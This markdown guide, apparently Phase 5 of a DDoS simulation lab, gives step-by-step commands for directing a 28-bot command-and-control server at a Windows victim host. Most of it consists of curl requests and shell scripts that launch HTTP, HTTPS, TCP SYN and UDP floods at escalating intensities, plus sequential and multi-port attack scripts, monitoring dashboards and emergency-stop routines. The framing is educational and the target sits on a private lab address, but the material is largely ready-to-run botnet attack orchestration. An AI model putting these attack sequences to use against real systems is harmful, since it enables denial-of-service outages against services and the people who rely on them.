# Phase 5: Attack Execution Commands

This file contains all commands to execute and manage DDoS attacks in your simulation lab.

## Prerequisites
- C2 server running and accessible
- All 28 bots connected and active
- Windows victim machine configured and accessible
- Monitoring tools ready

## Step 1: Pre-Attack Verification

### Verify System Status

```bash
# On C2 server - Check all components
curl -s http://localhost:8080/api/status | python3 -m json.tool

# Check connected bots
curl -s http://localhost:8080/api/bots | python3 -c "
import sys, json
data = json.load(sys.stdin)
print(f'Connected bots: {len(data[\"bots\"])}/28')
for bot in data['bots'][:5]:  # Show first 5 bots
    print(f'  - {bot[\"bot_id\"]}: {bot[\"ip_address\"]} ({bot[\"status\"]})')
if len(data['bots']) > 5:
    print(f'  ... and {len(data[\"bots\"]) - 5} more bots')
"

# Test target accessibility
curl -I http://192.168.1.200
ping -c 3 192.168.1.200
```

### Start Monitoring (Run in separate terminals)

```bash
# Terminal 1: Monitor C2 server logs
sudo journalctl -u ddos-c2 -f

# Terminal 2: Monitor attack statistics
watch -n 2 'curl -s http://localhost:8080/api/status | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    print(f\"Active bots: {data[\"active_bots\"]}\")
    if data.get(\"current_attack\"):
        attack = data[\"current_attack\"]
        print(f\"Attack: {attack[\"attack_type\"]} -> {attack[\"target_ip\"]}:{attack[\"target_port\"]}\")
        print(f\"Intensity: {attack[\"intensity\"]} req/sec per bot\")
    else:
        print(\"No active attack\")
except:
    print(\"Error getting status\")
"'

# Terminal 3: Monitor target (run on Windows victim)
# continuous_monitor.bat (created in Phase 4)
```

## Step 2: HTTP Flood Attack

### Basic HTTP Flood Attack

```bash
# Start HTTP flood attack
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "http-flood-001",
    "attack_type": "http_flood",
    "target_ip": "192.168.1.200",
    "target_port": 80,
    "intensity": 50,
    "duration": 60
  }'

# Monitor attack progress
curl -s http://localhost:8080/api/status | python3 -m json.tool

# Check attack logs
curl -s http://localhost:8080/api/logs?limit=20 | python3 -c "
import sys, json
data = json.load(sys.stdin)
for log in data['logs'][-10:]:
    print(f'{log[\"timestamp\"]}: {log[\"message\"]}')
"
```

### Escalated HTTP Flood Attack

```bash
# Higher intensity HTTP flood
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "http-flood-002",
    "attack_type": "http_flood",
    "target_ip": "192.168.1.200",
    "target_port": 80,
    "intensity": 100,
    "duration": 120
  }'

# Monitor target response time
for i in {1..10}; do
  echo "Test $i:"
  time curl -s http://192.168.1.200 > /dev/null
  sleep 5
done
```

### HTTPS Flood Attack

```bash
# Attack HTTPS port
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "https-flood-001",
    "attack_type": "http_flood",
    "target_ip": "192.168.1.200",
    "target_port": 443,
    "intensity": 75,
    "duration": 90
  }'
```

## Step 3: TCP SYN Flood Attack

### Basic TCP SYN Flood

```bash
# Start TCP SYN flood attack
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "tcp-syn-001",
    "attack_type": "tcp_syn",
    "target_ip": "192.168.1.200",
    "target_port": 80,
    "intensity": 30,
    "duration": 60
  }'

# Monitor network connections on target (Windows)
# netstat -an | findstr :80 | findstr SYN
```

### High-Intensity TCP SYN Flood

```bash
# Higher intensity SYN flood
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "tcp-syn-002",
    "attack_type": "tcp_syn",
    "target_ip": "192.168.1.200",
    "target_port": 80,
    "intensity": 50,
    "duration": 90
  }'
```

### Multi-Port TCP SYN Attack

```bash
# Attack multiple ports sequentially
PORTS=(80 443 3000 8000)

for PORT in "${PORTS[@]}"; do
  echo "Attacking port $PORT..."
  
  curl -X POST http://localhost:8080/api/attack/start \
    -H "Content-Type: application/json" \
    -d "{
      \"attack_id\": \"tcp-syn-port-$PORT\",
      \"attack_type\": \"tcp_syn\",
      \"target_ip\": \"192.168.1.200\",
      \"target_port\": $PORT,
      \"intensity\": 40,
      \"duration\": 30
    }"
  
  sleep 35  # Wait for attack to complete
done
```

## Step 4: UDP Flood Attack

### Basic UDP Flood

```bash
# Start UDP flood attack
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "udp-flood-001",
    "attack_type": "udp_flood",
    "target_ip": "192.168.1.200",
    "target_port": 53,
    "intensity": 80,
    "duration": 60
  }'
```

### High-Volume UDP Flood

```bash
# High-volume UDP flood
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "udp-flood-002",
    "attack_type": "udp_flood",
    "target_ip": "192.168.1.200",
    "target_port": 1234,
    "intensity": 150,
    "duration": 120
  }'
```

## Step 5: Combined Attack Scenarios

### Sequential Attack Pattern

```bash
# Create sequential attack script
cat > sequential_attacks.sh << 'EOF'
#!/bin/bash

echo "Starting sequential attack pattern..."

# Phase 1: HTTP Flood
echo "Phase 1: HTTP Flood Attack"
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "seq-http-001",
    "attack_type": "http_flood",
    "target_ip": "192.168.1.200",
    "target_port": 80,
    "intensity": 60,
    "duration": 45
  }'

sleep 50

# Phase 2: TCP SYN Flood
echo "Phase 2: TCP SYN Flood Attack"
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "seq-tcp-001",
    "attack_type": "tcp_syn",
    "target_ip": "192.168.1.200",
    "target_port": 80,
    "intensity": 40,
    "duration": 45
  }'

sleep 50

# Phase 3: UDP Flood
echo "Phase 3: UDP Flood Attack"
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "seq-udp-001",
    "attack_type": "udp_flood",
    "target_ip": "192.168.1.200",
    "target_port": 1234,
    "intensity": 100,
    "duration": 45
  }'

echo "Sequential attack pattern completed!"
EOF

chmod +x sequential_attacks.sh
./sequential_attacks.sh
```

### Stress Test Scenario

```bash
# Maximum intensity stress test
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "stress-test-001",
    "attack_type": "http_flood",
    "target_ip": "192.168.1.200",
    "target_port": 80,
    "intensity": 100,
    "duration": 300
  }'

# Monitor system resources during stress test
watch -n 1 'curl -s http://localhost:8080/api/status | python3 -c "
import sys, json
data = json.load(sys.stdin)
if data.get(\"current_attack\"):
    print(f\"Attack running: {data[\"current_attack\"][\"attack_type\"]}\")
    print(f\"Active bots: {data[\"active_bots\"]}\")
else:
    print(\"No active attack\")
"'
```

## Step 6: Attack Control Commands

### Stop Current Attack

```bash
# Stop any running attack
curl -X POST http://localhost:8080/api/attack/stop

# Verify attack stopped
curl -s http://localhost:8080/api/status | grep -o '"current_attack":[^,]*'
```

### Emergency Stop

```bash
# Emergency stop all attacks immediately
curl -X POST http://localhost:8080/api/emergency-stop

# Check emergency stop status
curl -s http://localhost:8080/api/status | python3 -m json.tool
```

### Check Attack Commands Status

```bash
# View active commands
curl -s http://localhost:8080/api/commands | python3 -m json.tool

# Check specific command status
COMMAND_ID="your-command-id-here"
curl -s http://localhost:8080/api/commands/$COMMAND_ID | python3 -m json.tool
```

## Step 7: Real-Time Monitoring

### Create Monitoring Dashboard

```bash
# Create real-time monitoring script
cat > monitor_dashboard.sh << 'EOF'
#!/bin/bash

while true; do
    clear
    echo "========================================"
    echo "    DDoS Simulation Lab Dashboard"
    echo "========================================"
    echo "Time: $(date)"
    echo

    # Get status
    STATUS=$(curl -s http://localhost:8080/api/status)
    
    echo "=== C2 Server Status ==="
    echo "$STATUS" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    print(f'Server IP: {data[\"server_ip\"]}:{data[\"server_port\"]}')
    print(f'Active bots: {data[\"active_bots\"]}/{data[\"max_bots\"]}')
    print(f'Active sessions: {data[\"active_sessions\"]}')
    
    if data.get('current_attack'):
        attack = data['current_attack']
        print(f'\\n=== Current Attack ===')
        print(f'Type: {attack[\"attack_type\"]}')
        print(f'Target: {attack[\"target_ip\"]}:{attack[\"target_port\"]}')
        print(f'Intensity: {attack[\"intensity\"]} req/sec per bot')
        print(f'Duration: {attack[\"duration\"]} seconds')
        print(f'Active bots: {len(attack[\"active_bots\"])}')
    else:
        print('\\n=== No Active Attack ===')
except Exception as e:
    print(f'Error: {e}')
"
    
    echo
    echo "=== Recent Logs ==="
    curl -s http://localhost:8080/api/logs?limit=5 | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    for log in data['logs'][-5:]:
        print(f'{log[\"timestamp\"][-8:]}: {log[\"message\"]}')
except:
    print('Error getting logs')
"
    
    echo
    echo "Press Ctrl+C to exit"
    sleep 3
done
EOF

chmod +x monitor_dashboard.sh
./monitor_dashboard.sh
```

### Monitor Target Performance

```bash
# Create target monitoring script (run on C2 server)
cat > monitor_target.sh << 'EOF'
#!/bin/bash

echo "Monitoring target performance..."
echo "Target: 192.168.1.200"
echo "==============================="

while true; do
    echo "$(date): Testing target response..."
    
    # Test HTTP response time
    HTTP_TIME=$(curl -o /dev/null -s -w "%{time_total}" http://192.168.1.200 2>/dev/null || echo "FAILED")
    
    # Test ping response
    PING_TIME=$(ping -c 1 192.168.1.200 2>/dev/null | grep "time=" | cut -d'=' -f4 | cut -d' ' -f1 || echo "FAILED")
    
    echo "  HTTP response time: ${HTTP_TIME}s"
    echo "  Ping time: ${PING_TIME}ms"
    echo
    
    sleep 5
done
EOF

chmod +x monitor_target.sh
```

## Step 8: Data Collection and Analysis

### Collect Attack Statistics

```bash
# Create statistics collection script
cat > collect_stats.sh << 'EOF'
#!/bin/bash

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
STATS_DIR="attack_stats_$TIMESTAMP"
mkdir -p "$STATS_DIR"

echo "Collecting attack statistics..."

# Collect C2 server status
curl -s http://localhost:8080/api/status > "$STATS_DIR/c2_status.json"

# Collect bot information
curl -s http://localhost:8080/api/bots > "$STATS_DIR/bot_info.json"

# Collect logs
curl -s http://localhost:8080/api/logs?limit=1000 > "$STATS_DIR/attack_logs.json"

# Collect command history
curl -s http://localhost:8080/api/commands > "$STATS_DIR/commands.json"

# Create summary report
python3 << PYTHON > "$STATS_DIR/summary_report.txt"
import json

print("DDoS Simulation Lab - Attack Summary Report")
print("=" * 50)

# Load status
with open("$STATS_DIR/c2_status.json") as f:
    status = json.load(f)

print(f"Report generated: $(date)")
print(f"C2 Server: {status['server_ip']}:{status['server_port']}")
print(f"Active bots: {status['active_bots']}/{status['max_bots']}")

# Load bot info
with open("$STATS_DIR/bot_info.json") as f:
    bots = json.load(f)

print(f"Total registered bots: {len(bots['bots'])}")

# Analyze logs
with open("$STATS_DIR/attack_logs.json") as f:
    logs = json.load(f)

attack_starts = [log for log in logs['logs'] if 'Attack started' in log['message']]
attack_stops = [log for log in logs['logs'] if 'Attack stopped' in log['message']]

print(f"Total attacks executed: {len(attack_starts)}")
print(f"Total attacks completed: {len(attack_stops)}")

print("\nRecent attack types:")
for log in attack_starts[-5:]:
    print(f"  - {log['timestamp']}: {log['message']}")
PYTHON

echo "Statistics collected in: $STATS_DIR"
ls -la "$STATS_DIR"
EOF

chmod +x collect_stats.sh
```

### Generate Attack Report

```bash
# Run statistics collection
./collect_stats.sh

# Create detailed analysis
cat > analyze_results.py << 'EOF'
#!/usr/bin/env python3
import json
import sys
from datetime import datetime

def analyze_attack_logs(stats_dir):
    print("DDoS Simulation Lab - Detailed Analysis")
    print("=" * 50)
    
    # Load logs
    with open(f"{stats_dir}/attack_logs.json") as f:
        logs_data = json.load(f)
    
    logs = logs_data['logs']
    
    # Analyze attack patterns
    attack_types = {}
    for log in logs:
        if 'Attack started' in log['message']:
            if 'http_flood' in log['message']:
                attack_types['HTTP Flood'] = attack_types.get('HTTP Flood', 0) + 1
            elif 'tcp_syn' in log['message']:
                attack_types['TCP SYN Flood'] = attack_types.get('TCP SYN Flood', 0) + 1
            elif 'udp_flood' in log['message']:
                attack_types['UDP Flood'] = attack_types.get('UDP Flood', 0) + 1
    
    print("Attack Type Distribution:")
    for attack_type, count in attack_types.items():
        print(f"  {attack_type}: {count} attacks")
    
    # Analyze bot performance
    with open(f"{stats_dir}/bot_info.json") as f:
        bots_data = json.load(f)
    
    bots = bots_data['bots']
    
    print(f"\nBot Performance Summary:")
    print(f"Total bots: {len(bots)}")
    
    if bots:
        avg_load = sum(bot.get('current_load', 0) for bot in bots) / len(bots)
        print(f"Average bot load: {avg_load:.2f}%")
        
        connected_bots = [bot for bot in bots if bot['status'] == 'connected']
        print(f"Connected bots: {len(connected_bots)}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 analyze_results.py <stats_directory>")
        sys.exit(1)
    
    analyze_attack_logs(sys.argv[1])
EOF

chmod +x analyze_results.py

# Run analysis on latest stats
LATEST_STATS=$(ls -td attack_stats_* | head -1)
python3 analyze_results.py "$LATEST_STATS"
```

## Step 9: Educational Scenarios

### Scenario 1: Gradual Escalation

```bash
# Demonstrate gradual attack escalation
cat > scenario_escalation.sh << 'EOF'
#!/bin/bash

echo "Educational Scenario: Gradual Attack Escalation"
echo "==============================================="

# Level 1: Light load
echo "Level 1: Light HTTP load (10 req/sec per bot)"
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "escalation-level-1",
    "attack_type": "http_flood",
    "target_ip": "192.168.1.200",
    "target_port": 80,
    "intensity": 10,
    "duration": 30
  }'

sleep 35

# Level 2: Medium load
echo "Level 2: Medium HTTP load (50 req/sec per bot)"
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "escalation-level-2",
    "attack_type": "http_flood",
    "target_ip": "192.168.1.200",
    "target_port": 80,
    "intensity": 50,
    "duration": 30
  }'

sleep 35

# Level 3: High load
echo "Level 3: High HTTP load (100 req/sec per bot)"
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "escalation-level-3",
    "attack_type": "http_flood",
    "target_ip": "192.168.1.200",
    "target_port": 80,
    "intensity": 100,
    "duration": 30
  }'

echo "Escalation scenario completed!"
EOF

chmod +x scenario_escalation.sh
```

### Scenario 2: Attack Type Comparison

```bash
# Compare different attack types
cat > scenario_comparison.sh << 'EOF'
#!/bin/bash

echo "Educational Scenario: Attack Type Comparison"
echo "==========================================="

# HTTP Flood Test
echo "Testing HTTP Flood Attack..."
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "comparison-http",
    "attack_type": "http_flood",
    "target_ip": "192.168.1.200",
    "target_port": 80,
    "intensity": 50,
    "duration": 60
  }'

sleep 65

# TCP SYN Flood Test
echo "Testing TCP SYN Flood Attack..."
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "comparison-tcp",
    "attack_type": "tcp_syn",
    "target_ip": "192.168.1.200",
    "target_port": 80,
    "intensity": 30,
    "duration": 60
  }'

sleep 65

# UDP Flood Test
echo "Testing UDP Flood Attack..."
curl -X POST http://localhost:8080/api/attack/start \
  -H "Content-Type: application/json" \
  -d '{
    "attack_id": "comparison-udp",
    "attack_type": "udp_flood",
    "target_ip": "192.168.1.200",
    "target_port": 1234,
    "intensity": 80,
    "duration": 60
  }'

echo "Attack type comparison completed!"
EOF

chmod +x scenario_comparison.sh
```

## Step 10: Safety and Emergency Procedures

### Emergency Stop All Operations

```bash
# Create emergency stop script
cat > emergency_stop_all.sh << 'EOF'
#!/bin/bash

echo "EMERGENCY STOP - Stopping all DDoS operations"
echo "=============================================="

# Stop current attack
echo "Stopping current attack..."
curl -X POST http://localhost:8080/api/emergency-stop

# Wait for stop to propagate
sleep 5

# Verify all attacks stopped
echo "Verifying attack status..."
curl -s http://localhost:8080/api/status | python3 -c "
import sys, json
data = json.load(sys.stdin)
if data.get('current_attack'):
    print('WARNING: Attack still active!')
else:
    print('All attacks stopped successfully')
"

# Check bot status
echo "Checking bot status..."
curl -s http://localhost:8080/api/bots | python3 -c "
import sys, json
data = json.load(sys.stdin)
attacking_bots = [bot for bot in data['bots'] if bot['status'] == 'attacking']
if attacking_bots:
    print(f'WARNING: {len(attacking_bots)} bots still in attacking state')
else:
    print('All bots returned to connected state')
"

echo "Emergency stop completed!"
EOF

chmod +x emergency_stop_all.sh
```

### System Recovery

```bash
# Create recovery verification script
cat > verify_recovery.sh << 'EOF'
#!/bin/bash

echo "System Recovery Verification"
echo "============================"

# Test target accessibility
echo "Testing target accessibility..."
if curl -s http://192.168.1.200 > /dev/null; then
    echo "✓ Target web server accessible"
else
    echo "✗ Target web server not accessible"
fi

# Test C2 server
echo "Testing C2 server..."
if curl -s http://localhost:8080/health > /dev/null; then
    echo "✓ C2 server responding"
else
    echo "✗ C2 server not responding"
fi

# Check bot connections
echo "Checking bot connections..."
BOT_COUNT=$(curl -s http://localhost:8080/api/bots | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    print(len(data['bots']))
except:
    print(0)
")

echo "Connected bots: $BOT_COUNT/28"

if [ "$BOT_COUNT" -eq 28 ]; then
    echo "✓ All bots connected"
elif [ "$BOT_COUNT" -gt 20 ]; then
    echo "⚠ Most bots connected ($BOT_COUNT/28)"
else
    echo "✗ Many bots disconnected ($BOT_COUNT/28)"
fi

echo "Recovery verification completed!"
EOF

chmod +x verify_recovery.sh
```

## Next Steps

After completing this phase:
1. Analyze collected attack data
2. Document observations and results
3. Proceed to Phase 6: Monitoring and Analysis

## Important Safety Notes

- Always use emergency stop if systems become unresponsive
- Monitor target system resources continuously
- Keep attack durations reasonable for educational purposes
- Document all attack parameters and results
- Ensure proper cleanup after each session